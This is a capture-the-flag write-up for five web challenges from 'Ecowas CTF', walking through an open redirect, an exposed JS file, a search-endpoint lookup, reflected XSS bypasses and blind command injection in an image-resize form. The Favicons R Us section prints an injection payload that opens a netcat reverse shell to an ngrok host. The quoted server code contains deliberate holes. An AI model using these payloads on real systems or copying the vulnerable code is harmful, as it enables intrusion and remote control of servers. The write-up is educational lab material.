<h1> Ecowas CTF </h1>

Challenges solved:

### Web
- Boarding
- Ezdirect
- SoppazShoes
- Favicons R Us
- Xss101


#### Boarding
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/820c912b-6510-49b0-a8ee-09e0563ec975)

After downloading the image it showed this
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/f854e0ad-8d7a-4177-8d13-a8c304fa64df)

From the image it looks like a flight ticket boarding pass and we can get this information from it:

```
Name: Elon
Last Name: Musk
Ticket code: NPYQBK
```

Back on the web page shows this
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/6f62e212-a79a-4973-a93e-6a98046704bf)

There's nothing interesting there except the `/manage` endpoint
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/31ceeabb-33b2-4f51-8eaf-d9cdf2fb3fd4)

I provided the data we have and submitted the form and on my network tab I got this
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/19c9d6b2-0cd5-4d37-a9f1-2b0dfe99b1bd)
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/3e580f27-c911-4ef6-9083-8dc80e69c41e)

We can see it's loading `user_info.js`

And the script is located `/static/js/{script}`
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/45e3cf21-5624-4121-a325-22a4f8d963c5)

Viewing the file showed the flag
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/6fee415c-1d60-4529-b9bc-3f95f7f763c6)

```
Flag: flag{when_you_play_ctf_and_find_elons_number}
```

#### ezdirect
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/77e7b64c-c8b5-4976-8daf-94348130a352)

The aim of this challenge is to build a url that redirects to `https://example.com/`

We are given the server python file

Here's the content

```python
@app.route("/logout", methods=["GET", "POST"])
def logout():
    session.clear()
    return redirect("/")


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"].strip()
        errors = []

        user = Users.query.filter_by(username=username).first()
        if user:
            pass_test = verify_password(plaintext=password, ciphertext=user.password)
            if pass_test is False:
                errors.append("Incorrect password")
        else:
            errors.append("User does not exist")

        if errors:
            return render_template("login.html", errors=errors)

        session["id"] = user.id

        if request.args.get("next"):
            return redirect(request.args.get("next"))
        else:
            return redirect("/")

    if request.args.get("next"):
        if authed():
            return redirect(request.args.get("next"))

    return render_template("login.html")


@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        try:
            user = Users(username=username, password=password)
            db.session.add(user)
            db.session.commit()
        except IntegrityError:
            return render_template("register.html", errors=["That username is already taken"])

        session["id"] = user.id
        return redirect("/")

    return render_template("register.html")


@app.route("/notes", methods=["GET", "POST"])
def notes():
    if authed() is False:
        return redirect(url_for("login", next=url_for("notes")))

    user_id = session["id"]

    if request.method == "POST":
        text = request.form["text"]
        note = Notes(text=text, owner_id=user_id)
        db.session.add(note)
        db.session.commit()
        return redirect(url_for("notes"))

    notes = Notes.query.filter_by(owner_id=user_id)

    return render_template("notes.html", notes=notes)


@app.route("/")
def index():
    return render_template("index.html")
```

We have 5 routes but I won't go through them all

The open redirect vulnerability occurs in this portion of the code

```python
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"].strip()
        errors = []

        user = Users.query.filter_by(username=username).first()
        if user:
            pass_test = verify_password(plaintext=password, ciphertext=user.password)
            if pass_test is False:
                errors.append("Incorrect password")
        else:
            errors.append("User does not exist")

        if errors:
            return render_template("login.html", errors=errors)

        session["id"] = user.id

        if request.args.get("next"):
            return redirect(request.args.get("next"))
        else:
            return redirect("/")

    if request.args.get("next"):
        if authed():
            return redirect(request.args.get("next"))

    return render_template("login.html")
```

We can see that if the `GET` parameter `?next` is in the `/login` route the web server will redirect to the url given

So the solution and the flag is this:

```
Flag: https://ctftogo-ezdirect.chals.io/login?next=https://example.com
```

#### SoppazShoes
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/8e8ffdc2-0aa6-46fa-91ad-73af7c263d05)

We are given the source code the web server uses

Here's the content

```python
@app.before_request
def session_start():
    if session.get("cart", None) is None:
        session["cart"] = []


@app.route("/")
def index():
    return redirect(url_for("shop"))


@app.route("/shop", defaults={"category": None})
@app.route("/shop/<category>")
def shop(category):
    categories = (
        Items.query.filter_by(hidden=False)
        .with_entities(Items.category)
        .distinct()
        .all()
    )
    categories = [c[0] for c in categories]
    items = Items.query.filter_by(category=category).all()
    return render_template("shop.html", categories=categories, items=items)


@app.route("/search")
def search():
    q = request.args.get("q", "")
    if q:
        items = Items.query.filter(Items.name.like(f"%{q}%")).all()
        resp = []
        for item in items:
            resp.append(
                {
                    "id": item.id,
                    "name": item.name,
                }
            )
    else:
        resp = []
    return jsonify(resp)


@app.route("/items/<int:item_id>", methods=["GET", "POST"])
def item(item_id):
    item = Items.query.filter_by(id=item_id).first_or_404()
    return render_template("item.html", item=item)


@app.route("/cart", methods=["GET", "POST", "DELETE"])
def cart():
    if request.method == "DELETE":
        item_id = int(request.form["item_id"])
        cart = session["cart"]
        try:
            cart.remove(item_id)
        except ValueError:
            return jsonify({"success": False})
        session["cart"] = cart
        return jsonify({"success": True})

    if request.method == "POST":
        item_id = int(request.form["item_id"])
        cart = session["cart"]
        if item_id not in cart:
            cart.append(item_id)
        session["cart"] = cart
        items = Items.query.filter(Items.id.in_(cart)).all()
        return render_template("cart.html", items=items)

    cart = session["cart"]
    items = Items.query.filter(Items.id.in_(cart)).all()
    return render_template("cart.html", items=items)


@app.route("/checkout")
def checkout():
    cart = session["cart"]
    items = Items.query.filter(Items.id.in_(cart)).all()
    return render_template("checkout.html", items=items)
```

To be honest I don't quite understand the goal of this challenge

But I noticed that in the `/items/` directory has various IDs

And the challenge description was referring to `All-Star Flags`

We can try manually getting what ID the shoe `All-Star Flags` is

But I noticed a function in the source code that lets us search value

```python
@app.route("/search")
def search():
    q = request.args.get("q", "")
    if q:
        items = Items.query.filter(Items.name.like(f"%{q}%")).all()
        resp = []
        for item in items:
            resp.append(
                {
                    "id": item.id,
                    "name": item.name,
                }
            )
    else:
        resp = []
    return jsonify(resp)
```

So we can make us of this to search for `All-Star Flags` 

Doing that gives this
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/4d5413f1-0c3d-4e34-841e-a7beba57735c)

Ok so the product is ID 40 and we can confirm it by accessing `/items/40`
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/6f0b709a-0e13-4ad9-bbbe-68527c63a989)

I added it to my cart and checkout
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/787cb176-32d9-4adf-b9cb-d2a75c054383)

And I got the flag
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/9773fd66-6e22-43d0-b985-beaf0fea2c23)

```
Flag:  flag{n0w_g3t_s0m3_r34l_y33zys}
```

#### Favicons R Us 
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/58befd92-eaa2-4968-adb3-1f58f7d6cc9c)

We are given the source code

Here's the content

```python
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        image = request.files["image"]
        size = request.form["size"]
        with tempfile.NamedTemporaryFile() as temp1, tempfile.NamedTemporaryFile() as temp2:
            temp1.write(image.read())
            cmd = f"convert {temp1.name} -resize {size} {temp2.name}"
            os.system(cmd)
            temp2.seek(0)
            image = b64encode(temp2.read()).decode("utf-8")
            return render_template("index.html", image=image)

    return render_template("index.html")
```

Basically it receives a file and resize it

And there's a command injection vulnerability

```python
image = request.files["image"]
size = request.form["size"]
cmd = f"convert {temp1.name} -resize {size} {temp2.name}"
os.system(cmd)
```

But we don't get any command output back so this is a blind command injection

To exploit this I set up ngrok and got a reverse shell

First let us upload a file (it doesn't check file type so we can upload any file )
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/91a4287f-da76-4bc1-bb13-c212d7fd9f50)
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/e90a5263-4606-4769-a6a0-b0846b12e3b6)

I'll be injecting my command in the size parameter and the reason is cause that's the only parameter where we can inject command as the `image` parameter will be turned to a random name 

Here's my payload
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/08c1aab5-53bb-45d8-bf07-208709ce204e)

```r
16x16$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 6.tcp.eu.ngrok.io 15049 >/tmp/f)
```

Back on my listener I got the reverse shell
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/7fc5aa4f-901b-496c-83bb-5d775a662408)

```
Flag: flag{not_as_good_as_toysrus_though}
```

### xss101
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/7983cbb1-b22a-4ecc-8690-841e5619ae9d)

No source this time :(

Going over to the web page shows this
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/5e9a60ee-8e80-4c1e-9463-ee02a775d4fb)

So let us start from Level 1

It shows a input box form
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/ca170fd7-a20b-4c34-a290-e79202caa4cb)

Searching for something returns the result
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/c2a28b06-9693-48ec-89f7-1f65878a6426)

We can inject html tags
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/064fd366-2c5f-41e2-a2a8-5aba8fe2f045)

The aim for all levels here is to call `alert('win')`

So I used javascrip tag `<script>` to achieve this
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/d2daf74e-ad3f-409e-bfb1-5740e3f176a4)

```
Payload: <script>alert('win')</script>
```

It redirects to Level 2 link and on clicking it shows this
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/d9e1cd86-f805-4468-88d7-0ab148f7f5af)

Another input box form

I searched for something and got the result reflected
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/e676aabf-cce3-40cd-ab95-b9a6ba4a6571)

When I tried injecting javascript tag I got this
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/2fadd1fa-a5d0-4ede-8519-e5542739f7b8)

It doesn't seem to render as tag so I looked at the page source and got this
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/efefbe94-96a5-42d9-8e4b-11b3ba136a82)

Our input is in the value field 

And to escape it I'll use a double quote and `>`

Here's the updated payload
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/dac09356-4416-417a-82b7-8ecc5b111b0b)

```
Payload: "><script>alert('win')</script>
```

We get to Level 3 and it showed this
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/ed95c486-9e7e-4a34-9401-603c4bf09d7d)

Same reflected content when we search a value
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/00f3da5e-39a0-4650-9ebb-103740c4493e)

But this time around we can't use `<` because it html encodes it
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/133432a6-846f-467e-bbd9-d197bbc0c0e7)

I'm not a XSS person so I searched up bypass and found a payload used on a portswigger lab challenge

Here's the payload

```
Payload: " autofocus onfocus=alert('win') closeme="
```

Using that worked
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/12d38006-0822-4bab-9f2f-12d29171e397)

In the next Level it just showed this
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/3428455a-299a-4a05-a862-5f125f138e72)

Page source shows this
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/c6aa044c-5f9f-4551-9e17-152fa3f9ecde)

This time it uses colour and our input will be in the `<script>` tag

Our input will be html encoded
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/bc53f518-404e-4485-be73-c97eea940700)

While looking for ways to solve this XSS challenge I came across a video that illustrated on how to bypass this but IDK where the link is again

But I saved the payload and here's it

```
Payload: %23000000'-alert('win')-'
```

Using that worked
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/ab2240f3-4a78-4657-add4-7ede9e952055)

And the next redirect linked gave the flag
![image](https://github.com/h4ckyou/Writeups_Unreleased/assets/127159644/82d33e91-49f1-4f0b-91b4-37f3f1117d31)

```
Flag: flag{congrats_you_now_have_a_degree_in_xss}
```
